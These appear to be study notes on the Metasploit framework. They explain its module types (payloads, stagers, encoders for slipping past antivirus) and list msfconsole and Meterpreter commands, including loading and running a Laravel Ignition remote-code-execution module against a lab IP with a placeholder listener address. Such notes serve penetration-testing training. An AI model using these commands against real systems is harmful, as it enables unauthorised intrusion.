**Exploit** A piece of code of code that uses a vulnerability present on the target system
**Vulnerability** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. 
**Payload** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access tot the target system, read confidential information) we need to use a payload. Payloads are the code that will run on the target system.

**Auxillary** Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
**Encoders** Will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
- signature-based anti-virus and security solutions have a DB of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks
**Evasion** While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. 
**Exploits** organized by target systems
**NOPS** No Operation, do nothing literally
- They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
**Payloads** code that will run on the target system
- *Singles* Self-contained payloads (add user, launch notepad.exe, etc) that do not need to download and additional component to run
- *Stagers* Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. "Staged Payloads" will first upload a stager on the target then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once
- *Stages*  Download by the stager. This will allow you to use larger sized payloads.
- *Post* Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.


start metasploit
```bash
~$ msfconsole
```

common commands
```bash
# view sessions 
~$ sessions  

# upgrade the last opened session to Meterpreter 
~$ sessions -u -1  

# interact with a session 
~$ sessions -i session_id  

# Background the currently interactive session, and go back to the Metasploit prompt 
~$ background

# To search for a module, use the ‘search’ command:
~$msf6 > search laravel

# Load a module with the ‘use’ command
~$ msf6 > use multi/php/ignition_laravel_debug_rce

# view the information about the module, including the module options, description, CVE details, etc
~$ msf6 exploit(multi/php/ignition_laravel_debug_rce) > inf0

# View the available options to set
~$ show options

# Set the target host and logging
~$ set rhost 10.10.163.96
~$ set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
~$ set lhost LISTEN_IP

# show options again
~$ show options

# Run or check the module
~$ check
~$ run

        
```

Meterpreter
common commands
```bash
# Get information about the remote system, such as OS
~$ sysinfo
# Upload a file or directory 
~$ upload local_file.txt  
# Display interfaces 
~$ ipconfig  
# Resolve a set of host names on the target to IP addresses - useful for pivoting resolve
~$ remote_service1 remote_service2
```




